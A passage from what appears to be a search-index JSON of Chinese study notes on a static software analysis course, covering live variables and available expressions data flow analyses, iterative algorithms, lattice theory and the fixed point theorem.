Data Flow Values \u4e00\u65e6\u88ab\u52a0\u5165 OUT \u4e4b\u540e\uff0c\u4f1a\u6c38\u8fdc\u4fdd\u7559\u3002\u5373 OUT \u53ea\u80fd 0\u21921 \u6216\u8005 1\u21921\uff0c\u4e0d\u53ef\u80fd x\u2192 0\u3002\u6b64\u5916\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0cIN \u4e0d\u53d8\u5316\u65f6\uff0cOUT \u4e5f\u4e0d\u4f1a\u53d8\u5316\u3002</li> <li>\u7531\u4e8e Data Flow Values \u662f\u6709\u9650\u7684\uff0c\u56e0\u6b64\u6700\u7ec8 OUT \u4e5f\u4e0d\u4f1a\u53d8\u5316\uff0c\u5faa\u73af\u56e0\u6b64\u505c\u6b62\u3002</li> </ul> <p></p> <p>TODO: \u89e3\u91ca</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#live-variables-analysis","title":"Live Variables Analysis","text":"<p>Definitions</p> <p>\u5982\u679c \u7a0b\u5e8f\u70b9 p \u5904\u7684 \u53d8\u91cf v \u53ef\u4ee5\u5728 CFG \u56fe\u4e2d\uff0c\u4ee5 p \u4e3a\u8d77\u59cb\u70b9\u7684 \u67d0\u6761 \u8def\u5f84\u4e2d\u88ab\u4f7f\u7528\uff0c\u5219\u79f0\u5176\u5728 \u7a0b\u5e8f\u70b9 p \u4e0a live\uff0c\u5426\u5219\u4e3a dead\u3002\u4e14\u5982\u679c \u53d8\u91cf v \u5728\u88ab\u4f7f\u7528\u4e4b\u524d\u88ab\u91cd\u5b9a\u4e49\u4e86\uff0c\u90a3\u4e5f\u8ba4\u4e3a\u5176\u4e3a dead</p> <p></p> <p>Usage</p> <p>Live variables \u7684\u5206\u6790\u7ed3\u679c\u53ef\u4ee5\u7528\u4e8e\u5bc4\u5b58\u5668\u5206\u914d\u3002</p> <p>\u4f8b\u5982\uff0c\u5728\u67d0\u4e2a\u65f6\u523b\uff0c\u6240\u6709\u5bc4\u5b58\u5668\u90fd\u6ee1\u4e86\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u4e00\u4e2a\u5bc4\u5b58\u5668\uff0c\u56e0\u6b64\u9700\u8981\u5220\u53bb\u5176\u4e2d\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\uff0c\u6b64\u65f6\u5e94\u8be5\u5220\u53bb\u5b58\u653e <code>dead variables</code> \u7684\u5bc4\u5b58\u5668\u3002</p> <p>Abstraction</p> <p>Data Flow Values/Facts\uff1a</p> <ul> <li>All the variables in a program</li> <li>Can be represented by bit vectors</li> <li>e.g., V1, V2, V3, V4, \u2026, V8 (8 definitions)</li> <li>\u4f7f\u7528\u6bd4\u7279\u8868\u793a\uff1a00000000\uff0c0 \u8868\u793a\u8be5\u53d8\u91cf Dead\uff0c1 \u8868\u793a\u8be5\u53d8\u91cf Live</li> </ul> <p>Safe-approximation</p> <ul> <li>Transfer Function\uff1aIN[B] = use<sub>B</sub> U (OUT[B] - def<sub>B</sub>);</li> <li>use<sub>B</sub>\u662f BB \u4e2d\u4f7f\u7528\u8fc7\u7684\u53d8\u91cf\u3002\u5982\u679c\u4f60\u5728 BB \u4e2d\u4f7f\u7528\u4e86\u53d8\u91cf\uff0c\u90a3\u8bf4\u660e\u8be5\u53d8\u91cf\u662f\u4ece IN[B]\u4f20\u5165\u7684\u3002</li> <li>OUT[B]\u987e\u540d\u601d\u4e49\uff0c\u5f53\u524d BB \u7684 OUT\u3002\u8be5\u7b97\u6cd5\u662f backwards direction\u3002</li> <li>def<sub>B</sub>\u662f\u6307\uff0c\u5982\u679c\u5f53\u524d BB \u4e2d\u91cd\u65b0\u5b9a\u4e49\u4e86\u53d8\u91cf v\uff0c\u90a3\u4e48\u8bf4\u660e\u8be5 v \u4e0d\u662f\u4ece IN[B]\u4e2d\u4f20\u5165\u7684\uff0c\u4e5f\u5c31\u662f dead \u7684\uff0c\u5e94\u8be5\u5c06\u5176\u7f6e\u4e3a 0</li> <li>Control Flow\uff1aOUT[B] = U<sub>S a successor of B</sub> IN[S];</li> <li>\u8be5\u7b97\u6cd5\u91c7\u7528 may analysis\uff0c\u56e0\u6b64\u5982\u679c\u9047\u5230\u5206\u652f\u6c47\u5408\u7684\u60c5\u51b5\uff0c\u53d6\u6240\u6709\u5206\u652f\u7684\u5e76\u96c6<code>\u222a</code>\u3002</li> <li>\u8be5\u7b97\u6cd5\u662f backwards direction\u3002</li> </ul> <p>Algorithm</p> <p>INPUT: CFG (def<sub>B</sub> and use<sub>B</sub> computed for each basic block B)</p> <p>OUTPUT: IN[B] and OUT[B] for each basic block B</p> <p>\u7b97\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>IN[exit] = \u2205;\nfor (each basic block B\\exit){\n  IN[B] = \u2205;\n}\nwhile (changes to any IN occur){            // \u8be5\u7b97\u6cd5\u662fbackwards direction\uff0c\u56e0\u6b64\u5f53 IN \u53d1\u751f\u6539\u53d8\u65f6\uff0c\u7ee7\u7eed\u5faa\u73af\uff0c\u800c\u4e0d\u662fOUT\u3002\n  for (each basic block B\\exit) {\n    OUT[B] = U S a successor of B IN[S];    // \u5373 Control Flow\n    IN[B] = useB U (OUT[B] - defB);         // \u5373 Transfer Function\n    }\n}\n</code></pre> <p></p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#available-expressions-analysis","title":"Available Expressions Analysis","text":"<p>Definitions</p> <p>\u7a0b\u5e8f\u70b9 p \u5904\u7684\u8868\u8fbe\u5f0f <code>x op y</code> \u662f available(\u53ef\u66ff\u6362) \u9700\u6ee1\u8db3 2 \u4e2a\u6761\u4ef6\uff1a</p> <ul> <li>\u4ece entry \u5230 p \u70b9\u7684 \u6240\u6709\u8def\u5f84 \u5fc5\u987b\u7ecf\u8fc7 <code>x op y</code></li> <li>\u6700\u540e\u4e00\u6b21\u4f7f\u7528 <code>x op y</code> \u4e4b\u540e\uff0c\u6ca1\u6709\u91cd\u5b9a\u4e49\u64cd\u4f5c\u6570 x\u3001y\u3002\u5982\u679c\u91cd\u5b9a\u4e49\u4e86 x \u6216 y\uff0c\u5982<code>x = a op2 b</code>\uff0c\u5219\u539f\u6765\u7684\u8868\u8fbe\u5f0f <code>x op y</code> \u4e2d\u7684 x \u6216 y \u5c31\u4f1a\u88ab\u66ff\u4ee3</li> </ul> <p>\u8fd9\u4e2a\u5b9a\u4e49\u8bf4\u660e\uff0c\u5728 p \u5904\u5982\u679c\u8868\u8fbe\u5f0f available\uff0c\u5c31\u53ef\u4ee5\u5c06\u5176\u66ff\u6362\u4e3a\u6700\u540e\u4e00\u6b21\u8fd0\u7b97\u7684\u7ed3\u679c\uff0c\u6216\u8005\u53ef\u4ee5\u68c0\u6d4b\u5168\u5c40\u901a\u7528\u8868\u8fbe\u5f0f\u3002</p> <p>Usage</p> <p>available expressions \u7684\u5206\u6790\u7ed3\u679c\u53ef\u4ee5\u7528\u4e8e\u63a2\u6d4b global common subexpressions</p> <p>\u5982\u679c\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u81ea\u59cb\u81f3\u7ec8\u662f available \u7684\uff0c\u5c31\u53ef\u4ee5\u5c06\u5176\u66ff\u6362\u4e3a \u6700\u540e\u4e00\u6b21\u8fd0\u7b97\u7684\u7ed3\u679c\uff0c\u6216\u8005\u53ef\u4ee5\u5c06\u5176\u63d0\u53d6\u4e3a\u5168\u5c40\u901a\u7528\u8868\u8fbe\u5f0f\u3002</p> <p>Abstraction</p> <p>Data Flow Values/Facts\uff1a</p> <ul> <li>All the expressions in a program</li> <li>Can be represented by bit vectors</li> <li>e.g., E1, E2, E3, E4, \u2026, VE (8 definitions)</li> <li>\u4f7f\u7528\u6bd4\u7279\u8868\u793a\uff1a00000000\uff0c1 \u8868\u793a\u8be5\u8868\u8fbe\u5f0f available</li> </ul> <p>Safe-approximation</p> <ul> <li>Transfer Function\uff1aOUT[B] = gen<sub>B</sub> U (IN[B] - kill<sub>B</sub>)</li> <li>gen<sub>B</sub> \u8868\u793a\u533a\u5757\u4e2d\u6240\u6709\u7684\u8868\u8fbe\u5f0f <code>x op y</code></li> <li>OUT[B]\u987e\u540d\u601d\u4e49\uff0c\u5f53\u524d BB \u7684 OUT\u3002\u8be5\u7b97\u6cd5\u662f forwards direction\u3002</li> <li>kill<sub>B</sub>\u662f\u6307\uff0c\u5982\u679c\u5f53\u524d BB \u4e2d\u5b58\u5728\u5bf9\u8868\u8fbe\u5f0f\u4e2d\u53d8\u91cf\u7684\u91cd\u5b9a\u4e49\uff0c\u4f8b\u5982\uff1a<code>x = 1</code>\uff0c\u6b64\u65f6\u9700\u8981\u5c06\u7528\u5230 <code>x</code> \u7684\u8868\u8fbe\u5f0f\u90fd kill \u6389\u3002</li> <li>Control Flow\uff1aIN[B] = \u2229 <sub>P a predecessor of B</sub> OUT[P]</li> <li>\u8be5\u7b97\u6cd5\u91c7\u7528 must analysis\uff0c\u56e0\u6b64\u5982\u679c\u9047\u5230\u5206\u652f\u6c47\u5408\u7684\u60c5\u51b5\uff0c\u53d6\u6240\u6709\u5206\u652f\u7684\u4ea4\u96c6\u3002</li> <li>\u8be5\u7b97\u6cd5\u662f forwards direction\u3002</li> </ul> <p>Algorithm</p> <p>INPUT: CFG (kill<sub>B</sub> and gen<sub>B</sub> computed for each basic block B)</p> <p>OUTPUT: IN[B] and OUT[B] for each basic block B</p> <p>\u7b97\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>OUT[entry] = \u2205;\nfor (each basic block B\\entry){\n  OUT[B] = \u222a;\n  // \u521d\u59cb\u5316\u4e3a11111111\uff08\u793a\u4f8b\u53d68\u4f4d\uff09\u800c\u4e0d\u662f00000000\uff0c\u5176\u539f\u56e0\u6709\u5f88\u591a\uff0c\u6bd4\u5982\uff0c\u7531\u4e8e\u662fmust analysis\uff0c\u56e0\u6b64\u53d6\u4ea4\u96c6\uff0c\u82e5\u521d\u59cb\u5316\u4e3a00000000\uff0c\u52190\u4e0e\u4efb\u4f55\u503c\u7684\u4ea4\u96c6\u90fd\u662f0\uff0c\u5c31\u5931\u53bb\u4e86\u610f\u4e49\uff01\n}\nwhile (changes to any OUT occur){            // \u5f53 OUT \u53d1\u751f\u6539\u53d8\u65f6\uff0c\u7ee7\u7eed\u5faa\u73af\n  for (each basic block B\\entry) {\n    IN[B] = P a predecessor of B OUT[P];    // \u5373 Control Flow\uff0c\u6240\u6709\u4e0a\u6d41\u5206\u652f\u7684\u4ea4\u96c6\u4f5c\u4e3a\u8be5BB\u7684\u8f93\u5165\n    OUT[B] = genB U (IN[B] - killB);         // \u5373 Transfer Function\n    }\n}\n</code></pre> <p></p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#summary","title":"summary","text":""},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#_3","title":"\u6570\u636e\u6d41\u5206\u6790\u7406\u8bba\u57fa\u7840","text":""},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#iterative-algorithm-another-view","title":"Iterative Algorithm, Another View","text":"<p>\u4e0a\u8282\u4e2d\uff0c\u7ed9\u51fa\u4e86\u4e09\u79cd\u9759\u6001\u5206\u6790\u5e94\u7528\u7684\u8fed\u4ee3\u7b97\u6cd5\u903b\u8f91\uff0c\u4e0b\u9762\u4ecb\u7ecd\u4e0a\u8ff0\u8fed\u4ee3\u7b97\u6cd5\u7684\u53e6\u4e00\u79cd\u89c6\u89d2\u3002</p> <ul> <li> <p>\u7ed9\u5b9a\u4e00\u4e2a\u6709 k \u4e2a\u8282\u70b9 CFG\uff0c\u6bcf\u4e2a\u8282\u70b9\u53ef\u4ee5\u662f BB \u6216\u8005 statement\u3002\u6b64\u65f6\u8fed\u4ee3\u7b97\u6cd5\u7684\u5de5\u4f5c\u662f\uff0c\u5728\u6bcf\u6b21\u8fed\u4ee3\u7684\u4e3a\u6bcf\u4e2a\u8282\u70b9\u65f6\u5019\u66f4\u65b0 OUT[n]\u3002</p> </li> <li> <p>\u5047\u8bbe\uff0c\u6570\u636e\u6d41\u5206\u6790\u7684 Domain of values \u662f V\uff0c\u90a3\u4e48\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a k-tuple\uff1a(OUT[n<sub>1</sub>], OUT[n<sub>2</sub>], ..., OUT[n<sub>k</sub>])\uff0c\u7528\u4e8e\u4fdd\u5b58\u6bcf\u6b21\u8fed\u4ee3\u540e\u7684\u5206\u6790\u7ed3\u679c\u3002</p> </li> </ul> <p>$$   (OUT[n_1], OUT[n_2], ..., OUT[n_k])\u2208(V_1\u00d7V_2...\u00d7V_k)=V^k   $$</p> <p>(V<sub>1</sub> \u00d7 V<sub>2</sub> ... \u00d7 V<sub>k</sub>) \u662f\u7b1b\u5361\u5c14\u79ef\u3002</p> <ul> <li>\u6bcf\u6b21\u8fed\u4ee3\u53ef\u4ee5\u770b\u505a\u662f\u901a\u8fc7 transfer functions \u548c control-flow\uff0c\u5c06 old V<sup>k</sup>\u66f4\u65b0\u4e3a new V<sup>k</sup>\uff0c\u5c06\u5176\u62bd\u8c61\u4e3a\u4e00\u4e2a\u65b9\u6cd5 F:V<sup>k</sup>\u2192V<sup>k</sup></li> </ul> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u7ecf\u8fc7 i+1 \u6b21\u8fed\u4ee3\u4e4b\u540e\uff0c\u4f1a\u5f97\u5230\uff1aX<sub>i</sub>=X<sub>i+1</sub>\uff0c\u6b64\u65f6\u5230\u8fbe\u4e0d\u52a8\u70b9\uff08Fixed Point\uff09\uff0c\u5b9a\u4e49\u4e3a\uff1a\u5f53 X=F(X)\u65f6\uff0c\u79f0 X \u4e3a\u4e0d\u52a8\u70b9\u3002</p> <p>\u8fed\u4ee3\u7b97\u6cd5\u63d0\u4f9b\u4e86\u6570\u636e\u6d41\u5206\u6790\u7684\u89e3\u51b3\u65b9\u6cd5\uff0c\u4f46\u5b58\u5728\u4e00\u4e9b\u672a\u80fd\u56de\u7b54\u7684\u95ee\u9898\uff1a</p> <ul> <li>\u7b97\u6cd5\u662f\u5426\u786e\u4fdd\u4e00\u5b9a\u80fd\u505c\u6b62/\u8fbe\u5230\u4e0d\u52a8\u70b9\uff1f\u4f1a\u4e0d\u4f1a\u603b\u662f\u6709\u4e00\u4e2a\u89e3\u7b54\uff1f</li> <li>\u5982\u679c\u80fd\u5230\u8fbe\u4e0d\u52a8\u70b9\uff0c\u90a3\u4e48\u662f\u4e0d\u662f\u53ea\u6709\u4e00\u4e2a\u4e0d\u52a8\u70b9\uff1f\u5982\u679c\u6709\u591a\u4e2a\u4e0d\u52a8\u70b9\uff0c\u6211\u4eec\u7684\u7ed3\u679c\u662f\u6700\u4f18\u7684\u5417\uff1f</li> <li>\u4ec0\u4e48\u65f6\u5019\u6211\u4eec\u4f1a\u80fd\u5f97\u5230\u4e0d\u52a8\u70b9\uff1f</li> </ul> <p>\u4e3a\u4e86\u56de\u7b54\u4e0a\u8ff0\u95ee\u9898\uff0c\u9700\u8981\u4e00\u5b9a\u7684\u6570\u5b66\u57fa\u7840\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#partial-order","title":"Partial Order","text":"<p>\u8bbe P \u662f\u96c6\u5408\uff0cP \u4e0a\u7684\u4e8c\u5143\u5173\u7cfb\uff08\u8bb0\u4f5c \u2264\uff09\u6ee1\u8db3\u4ee5\u4e0b\u4e09\u4e2a\u6761\u4ef6\uff0c\u5219\u79f0\u201c\u2264\u201d\u662f P \u4e0a\u7684\u504f\u5e8f\u5173\u7cfb\uff1a</p> <p>\uff081\uff09\u81ea\u53cd\u6027 Reflexivity\uff1aa\u2264a\uff0c\u2200a\u2208P\uff1b</p> <p>\uff082\uff09\u53cd\u5bf9\u79f0\u6027 Antisymmetry\uff1a\u2200a\uff0cb\u2208P\uff0c\u82e5 a\u2264b \u4e14 b\u2264a\uff0c\u5219 a=b\uff1b</p> <p>\uff083\uff09\u4f20\u9012\u6027 Transitivity\uff1a\u2200a\uff0cb\uff0cc\u2208P\uff0c\u82e5 a\u2264b \u4e14 b\u2264c\uff0c\u5219 a\u2264c\uff1b</p> <p>\u6ce8\uff1a\u6b64\u5904\u7684 \u2264 \u5e76\u975e\u662f\u5c0f\u4e8e\u7b49\u4e8e\uff0c\u800c\u662f\u504f\u5e8f\u5173\u7cfb\u3002</p> <p>\u5177\u6709\u504f\u5e8f\u5173\u7cfb\u7684\u96c6\u5408 P \u4e3a\u504f\u5e8f\u96c6\uff08\u6216\u79f0\u534a\u5e8f\u96c6\uff0cposet\uff09\uff0c\u8bb0\u4e3a\uff08P\uff0c\u2264\uff09\u3002</p> <p>\u4f8b\u5b50\uff0c\u95ee (S, \u2264) \u662f\u5426\u662f\u504f\u5e8f\u96c6\u5408\uff1a</p> <ul> <li>\u82e5 S \u662f\u6574\u6570\u96c6\u5408\uff0c\u2264 \u4ee3\u8868\u5c0f\u4e8e\u7b49\u4e8e\uff0c\u5219 S \u662f\u504f\u5e8f\u96c6\u5408</li> <li>\u82e5 S \u662f\u6574\u6570\u96c6\u5408\uff0c\u2264 \u4ee3\u8868\u5c0f\u4e8e\uff0c\u5219 S \u4e0d\u662f\u504f\u5e8f\u96c6\u5408\uff08\u4e0d\u6ee1\u8db3\u81ea\u53cd\u6027\uff0c\u56e0\u4e3a\u4e0d\u6ee1\u8db3 1 &lt; 1\uff09</li> <li>\u82e5 S \u662f\u82f1\u6587\u5355\u8bcd\u7684\u96c6\u5408\uff0c\u2264 \u4ee3\u8868\u5b50\u96c6\u5173\u7cfb\uff0c\u5373 sing \u2264 singing\uff0c\u8868\u793a\u524d\u8005\u662f\u540e\u8005\u7684\u5b50\u96c6\uff0c\u6b64\u65f6 S \u4e5f\u662f\u6ee1\u8db3\u4e0a\u8ff0\u4e09\u4e2a\u7279\u6027\u7684\uff0c\u56e0\u6b64 S \u4e5f\u4e3a\u504f\u5e8f\u96c6\u5408</li> </ul> <p></p> <ul> <li>\u82e5 S \u662f\u96c6\u5408 {a,b,c} \u7684</li> </ul> <p>\u5982\u56fe\u6240\u793a\uff0c\u504f\u5e8f\u96c6\u5408\u4e2d\u7684\u4efb\u610f\u4e24\u4e2a\u5143\u7d20\u53ef\u80fd\u6ca1\u6709\u4efb\u4f55\u5173\u7cfb\uff0c\u4f8b\u5982 pin \u548c sin\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#upper-and-lower-bounds","title":"Upper and Lower Bounds","text":"<p>\u5bf9\u4e8e\u504f\u5e8f\u96c6 P \u4e2d\u7684\u67d0\u5b50\u96c6 S \u6765\u8bf4\uff1a</p> <ul> <li> <p>\u82e5\u5b58\u5728\u5143\u7d20 u \u2208 P\uff0c \u5bf9\u4e8e\u4efb\u610f x \u2208 S\uff0c\u90fd\u6ee1\u8db3 x \u2264 u\uff0c\u6b64\u65f6\u79f0 u \u662f S \u7684\u4e0a\u754c\uff08Upper bound\uff09\u3002</p> </li> <li> <p>\u7c7b\u4f3c\u7684\uff0c\u82e5\u5b58\u5728\u5143\u7d20 l \u2208 P\uff0c\u5bf9\u4e8e\u4efb\u610f x \u2208 S\uff0c\u90fd\u6ee1\u8db3 l \u2264 x\uff0c\u6b64\u65f6\u79f0 l \u662f S \u7684\u4e0b\u754c\uff08Lower bound\uff09\u3002</p> </li> </ul> <p>\u7136\u540e\u6211\u4eec\u884d\u751f\u51fa\u6700\u5c0f\u4e0a\u754c\u548c\u6700\u5927\u4e0b\u754c\u7684\u6982\u5ff5\uff1a</p> <ul> <li>\u6700\u5c0f\u4e0a\u754c\uff08lub or join\uff09\uff0c\u8bb0\u4f5c \u2294S\uff0c\u5bf9\u4e8e S \u7684\u4efb\u610f\u4e0a\u754c u\uff0c\u6ee1\u8db3 \u2294S \u2264 u\u3002</li> <li>\u7c7b\u4f3c\u7684\uff0c\u6700\u5927\u4e0b\u5c4a\uff08glb or meet\uff09\uff0c\u8bb0\u4f5c \u2293S\uff0c\u5bf9\u4e8e S \u7684\u4efb\u610f\u4e0b\u754c l\uff0c\u6ee1\u8db3 l \u2264 \u2293S</li> </ul> <p></p> <p>\u901a\u5e38\uff0c\u5982\u679c S \u4e2d\u4ec5\u5305\u542b\u4e24\u4e2a\u5143\u7d20 a \u548c b\uff08S={a, b}\uff0c\u90a3\u4e48\uff1a</p> <ul> <li>\u2294S can be written a \u2294 b (the join of a and b)</li> <li>\u2293S can be written a \u2293 b (the meet of a and b)</li> </ul> <p>\u5e76\u4e0d\u662f\u6bcf\u4e2a\u504f\u5e8f\u96c6\u90fd\u6709 lub \u548c glb\uff0c\u4f46\u662f\u5982\u679c\u6709\uff0c\u90a3\u4e48\u8be5 lub, glb \u5c06\u662f\u552f\u4e00\u7684\u3002</p> <p></p> <pre><code>// \u8bc1\u660e\u552f\u4e00\nassume g1 and g2 are both glbs of poset P\naccording to the definition of glb\ng1 \u2291 (g2 = \u2293P) and g2 \u2291 (g1 = \u2293P)\nby the antisymmetry of partial order \u2291\ng1 = g2\n</code></pre>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#lattice-semilattice-complete-and-product-lattice","title":"Lattice, Semilattice, Complete and Product Lattice","text":"<p>\uff081\uff09Lattice \u683c</p> <p>Given a poset (P, \u2291), \u2200a, b \u2208 P, if a \u2294 b and a \u2293 b exist, then (P, \u2291) is called a lattice</p> <p>\u901a\u4fd7\u7684\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u504f\u5e8f\u96c6\u4e2d\u7684 \u4efb\u610f\u4e24\u4e2a\u5143\u7d20\uff0c\u90fd\u5b58\u5728\u6700\u5c0f\u4e0a\u754c\u548c\u6700\u5927\u4e0b\u754c\uff0c\u90a3\u4e48\u8fd9\u4e2a\u504f\u5e8f\u96c6\u79f0\u4e3a Lattice\u3002</p> <p>\uff082\uff09Semilattice \u534a\u683c</p> <p>Given a poset (P, \u2291), \u2200a, b \u2208 P,</p> <ul> <li> <p>if only a \u2294 b exists, then (P, \u2291) is called a join semilattice</p> </li> <li> <p>if only a \u2293 b exists, then (P, \u2291) is called a meet semilattice</p> </li> </ul> <p>\u901a\u4fd7\u7684\u8bf4\uff0c\u5c31\u662f\u53ea\u5b58\u5728\u4e00\u4e2a\u4e0a\u754c\u6216\u4e0b\u754c\u3002</p> <p>\uff083\uff09Complete Lattice</p> <p>Given a lattice (P, \u2291), for arbitrary subset S of P, if \u2294S and \u2293S exist, then (P, \u2291) is called a complete lattice</p> <p>\u901a\u4fd7\u7684\u8bf4\uff0c\u5982\u679c\u4e00\u4e2a\u504f\u5e8f\u96c6\u7684\u6240\u6709\u5b50\u96c6\uff0c\u90fd\u5b58\u5728\u6700\u5c0f\u4e0a\u754c\u548c\u6700\u5927\u4e0b\u5c4a\uff0c\u90a3\u4e48\u8fd9\u4e2a\u504f\u5e8f\u96c6\u79f0\u4e3a Complete Lattice\u3002</p> <p>\u4f8b\u5982\uff0c\u5f53 P \u4e3a\u6574\u6570\u96c6\u5408\uff0c\u2291 \u4e3a\u5c0f\u4e8e\u7b49\u4e8e\u5173\u7cfb\u65f6\u3002(P, \u2291) \u4e0d\u662f\u4e00\u4e2a\u5b8c\u5907\u683c\u3002\u56e0\u4e3a\u5bf9\u4e8e\u6240\u6709\u6b63\u6574\u6570\u6784\u6210\u7684\u5b50\u96c6\uff0c\u5b83\u4e0d\u5b58\u5728\u4e0a\u754c\uff0c\u4e5f\u5c31\u4e0d\u5b58\u5728 \u2294S\u3002</p> <p>Every complete lattice (P, \u2291) has</p> <ul> <li>a greatest element = \u2294P called top</li> <li>a least element \u22a5 = \u2293P called bottom</li> </ul> <p>\u7ed3\u5408 Lattice \u7684\u5b9a\u4e49\uff0c\u53ef\u4ee5\u5f97\u77e5\uff1aEvery finite lattice (P is finite) is a complete lattice</p> <ul> <li>\u6709\u7a77\u7684 lattice \u4e00\u5b9a\u662f Complete Lattice</li> <li>\u4f46 Complete Lattice \u4e0d\u4e00\u5b9a\u662f\u6709\u7a77\u7684 lattice\u3002\uff08e.g. 0 \u548c 1 \u4e4b\u524d\u6240\u6709\u7684\u5b9e\u6570\uff0c\u65e0\u7a77\u591a\uff0c\u4f46\u6709 top \u548c bottom\uff0c\u6240\u4ee5\u662f Complete Lattice\u3002</li> </ul> <p>\uff084\uff09Product Lattice</p> <p>Given lattices L<sub>1</sub> = (P<sub>1</sub>, \u22911), L<sub>2</sub> = (P<sub>2</sub>, \u22912), \u2026, L<sub>n</sub> = (P<sub>n</sub>, \u2291n), if for all i, (P<sub>i</sub> , \u2291<sub>i</sub> ) has:</p> <ul> <li>\u2294<sub>i</sub> (least upper bound)</li> <li>and \u2293<sub>i</sub> (greatest lower bound),</li> </ul> <p>then we can have a product lattice L<sub>n</sub> = (P, \u2291) that is defined by:</p> <ul> <li>P = P<sub>1</sub> \u00d7 \u2026 \u00d7 P<sub>n</sub></li> </ul> <p>\u7b1b\u5361\u5c14\u79ef</p> <ul> <li> <p>(x<sub>1</sub>, \u2026, x<sub>n</sub>) \u2291 (y<sub>1</sub>, \u2026, y<sub>n</sub>) \u27fa (x<sub>1</sub> \u2291 y<sub>1</sub>) \u2227 \u2026 \u2227 (x<sub>n</sub> \u2291 y<sub>n</sub>)</p> </li> <li> <p>(x<sub>1</sub>, \u2026, x<sub>n</sub>) \u2294 (y<sub>1</sub>, \u2026, y<sub>n</sub>) = (x<sub>1</sub> \u2294<sub>1</sub> y<sub>1</sub>, \u2026, x<sub>n</sub> \u2294<sub>n</sub> y<sub>n</sub>)</p> </li> <li> <p>(x<sub>1</sub>, \u2026, x<sub>n</sub>) \u2293 (y<sub>1</sub>, \u2026, y<sub>n</sub>) = (x<sub>1</sub> \u2293<sub>1</sub> y<sub>1</sub>, \u2026, x<sub>n</sub> \u2293<sub>n</sub> y<sub>n</sub>)</p> </li> </ul> <p>\u5176\u6027\u8d28\u5982\u4e0b\uff1a</p> <ul> <li>\u4e00\u4e2a product lattice \u4e5f\u662f\u4e00\u4e2a lattice</li> <li>if a product lattice L is a product of complete lattices, then L is also complete</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#data-flow-analysis-framework-via-lattice","title":"Data Flow Analysis Framework via Lattice","text":"<p>data flow analysis framework (D, L, F) consists of:</p> <ul> <li>D: a direction of data flow: forwards or backwards</li> <li>L: a lattice including domain of the values V and a meet \u2293 or join \u2294 operator</li> <li>F: a family of transfer functions from V to V</li> </ul> <p>\u6570\u636e\u6d41\u5206\u6790\u53ef\u4ee5\u770b\u4f5c\u662f\u8fed\u4ee3\u5730\u4f7f\u7528 transfer functions \u548c\u5bf9 lattice \u7684\u503c\u8fdb\u884c meet/join \u64cd\u4f5c\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#monotonicity-and-fixed-point-theorem","title":"Monotonicity and Fixed Point Theorem","text":"<p>\u56de\u770b\u6211\u4eec\u5728\u4e0a\u9762\u63d0\u51fa\u7684\u95ee\u9898\uff1a\u8fed\u4ee3\u7b97\u6cd5\u5728\u4ec0\u4e48\u6761\u4ef6\u4e0b\u53ef\u4ee5\u505c\u673a\uff1f\u6211\u4eec\u5728\u8fd9\u91cc\u5f15\u5165\u4e0d\u52a8\u70b9\u5b9a\u7406</p> <p>\uff081\uff09Monotonicity</p> <p>A function f: L \u2192 L (L is a lattice) is monotonic if \u2200x, y \u2208 L, x \u2291 y \u27f9 f(x) \u2291 f(y)</p> <p>\u5355\u8c03\u6027\uff0c\u5373 x \u5c0f\u4e8e y\uff0c\u5219 f(x) \u5c0f\u4e8e f(y)</p> <p>\uff082\uff09Fixed Point Theorem</p> <p>\u7ed9\u5b9a\u4e00\u4e2a complete lattice (L, \u2291)\uff0c\u5982\u679c\uff1a</p> <ul> <li>f: L \u2192 L \u662f\u5355\u8c03\u7684\uff08Monotonicity\uff09</li> <li>L 